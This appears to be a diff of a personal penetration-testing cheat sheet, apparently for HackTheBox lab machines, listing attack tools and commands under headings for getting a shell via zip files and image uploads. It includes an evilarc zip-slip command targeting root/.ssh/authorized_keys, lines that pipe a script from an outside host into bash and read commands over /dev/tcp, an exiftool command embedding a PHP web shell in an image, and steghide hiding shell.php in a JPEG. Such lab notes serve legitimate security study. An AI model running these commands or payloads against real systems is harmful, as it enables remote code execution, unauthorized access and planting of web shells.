@@ -1,21 +1,37 @@
 Hello Humans!
 
 https://github.com/pentestmonkey/php-reverse-shell
+dirsearch.py -u http://10.10.10.146 -e php
 
-https://github.com/snyk/zip-slip-vulnerability
+enumeration after nmap for http port can test to curl first
 
-https://github.com/ptoomey3/evilarc
-python evilarc.py -i unix -d 2 -p root/.ssh authorized_keys
+{ ##getting shell using zip file 
+  https://github.com/snyk/zip-slip-vulnerability
 
-https://github.com/rebootuser/LinEnum
-nc -lvnp 9001 < LinEnum.sh
--l           listen mode, for inbound connects
--v           verbose [use twice to be more verbose]
--n           numeric-only IP addresses, no DNS
--p port      local port number (port numbers can be individual or ranges: lo-hi [inclusive])
+  https://github.com/ptoomey3/evilarc
+  python evilarc.py -i unix -d 2 -p root/.ssh authorized_keys
 
-bash < /dev/tcp/10.10.14.3/9001
+  https://github.com/rebootuser/LinEnum
+  nc -lvnp 9001 < LinEnum.sh
+  -l           listen mode, for inbound connects
+  -v           verbose [use twice to be more verbose]
+  -n           numeric-only IP addresses, no DNS
+  -p port      local port number (port numbers can be individual or ranges: lo-hi [inclusive])
 
-python -m SimpleHTTPServer
-curl 10.10.14.3:800/LinEnum.sh | bash
+  bash < /dev/tcp/10.10.14.3/9001
+
+  python -m SimpleHTTPServer
+  curl 10.10.14.3:800/LinEnum.sh | bash
+}
+
+
+{ ##getting shell using image upload
+  https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3
+  
+  https://xapax.gitbooks.io/security/content/bypass_image_upload.html
+  exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg 
+
+  https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
+  steghide embed -cf php-logo.jpeg -ef shell.php
+}
 
